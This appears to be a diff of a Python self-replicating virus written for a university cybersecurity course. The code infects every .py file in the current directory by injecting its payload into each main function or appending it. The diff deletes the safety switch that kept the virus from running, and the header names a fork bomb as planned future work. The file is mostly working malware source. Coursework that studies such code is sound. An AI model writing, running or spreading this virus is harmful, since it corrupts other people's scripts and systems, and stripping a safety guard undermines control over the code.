@@ -1,25 +1,22 @@
 '''
 --------------------------------------------------------------------------------
-Date Created:   11/07/2024
-Date Modified:  11/23/2024
-Version:        3.0
-Author:         Lino Mercado-Esquivias (lino.a.mercado@gmail.com)
+Class:          ECE 4305 Cybersecurity
+Group Number:   2
+Group Members:  Jess Leal
+                Jaemin Kim
+                Huaishu Huang
+                Lino Mercado-Esquivias
 
 Description:    Self Replicating Virus
                 A virus that infects other python scripts. It takes malicious
-                and injects it at the beginning of the main function of each
+                code and injects it at the beginning of the main function of 
+                other python scripts.
 
-Future Work:    1) Add malicious functionality (i.e. fork bomb)
+Future Work:    1) Add malicious function (i.e. fork bomb)
 --------------------------------------------------------------------------------
 '''
 
-# SAFETY SWITCH
-RUN_PROGRAM = True     # set to True to run the virus
-
 def main():
-    if not RUN_PROGRAM:
-        exit(0)
-
     # prepare payload
     virus_payload = prepare_payload()
     # search for and infect potential hosts
@@ -48,7 +45,7 @@ def spread_infection(virus_payload):
     # MALICIOUS SEGMENT BEGIN
     import re
     from glob import glob
-    import lino_colors as colors 
+    import colors as colors 
 
     main_function_pattern =  r"""
     ^\s*                        # Leading whitespace
@@ -66,37 +63,38 @@ def spread_infection(virus_payload):
     regex = re.compile(main_function_pattern, re.VERBOSE)
 
     # search for potential hosts
-    potential_hosts = glob("*.py")
-    for vector in potential_hosts:
-        with open(vector, "r") as vector_file:
-            unpacked_vector_file = vector_file.readlines()
+    current_directory_files = glob("*.py")
+    for file in current_directory_files:
+        with open(file, "r") as f:
+            file_code = f.readlines()
 
         # check if vector is infected
-        vector_infected = False
-        main_definition = -1
-        for line_number,line in enumerate(unpacked_vector_file, start=1):
+        file_is_infected = False
+        main_function_line_number = -1
+        for line_number,line in enumerate(file_code, start=1):
             if line.strip() == "# MALICIOUS SEGMENT BEGIN":
-                vector_infected = True
+                file_is_infected = True
                 break
             elif (match := regex.match(line)):
-                main_definition = line_number
+                main_function_line_number = line_number
 
-        # inject payload
-        if not vector_infected and main_definition != -1:
+        # inject payload inside main if main() exists
+        if not file_is_infected and main_function_line_number != -1:       
             infected_code = []
             modified_payload = ["    " + line for line in virus_payload]
-            infected_code = unpacked_vector_file
-            infected_code[main_definition:main_definition] = virus_payload
-            with open(vector, "w") as vector_file:
-                print(f"File {vector} infected.")
-                vector_file.writelines(infected_code)
-        elif not vector_infected and main_definition == -1:
-            infected_code = unpacked_vector_file + virus_payload
-            with open(vector, "w") as vector_file:
-                print(f"File {vector} infected.")
-                vector_file.writelines(infected_code)
+            infected_code = file_code
+            infected_code[main_function_line_number:main_function_line_number] = virus_payload
+            with open(file, "w") as f:
+                print(f"File {file} has been infected.")
+                f.writelines(infected_code)
+        # inject payload at the bottom if main() doesn't exist
+        elif not file_is_infected and main_function_line_number == -1:     
+            infected_code = file_code + virus_payload
+            with open(file, "w") as f:
+                print(f"File {file} has beeninfected.")
+                f.writelines(infected_code)
         else:
-            print(f"File {vector} has already been infected.")
+            print(f"File {file} has already been infected.")
     # MALICIOUS SEGMENT END
 
 if __name__ == "__main__":
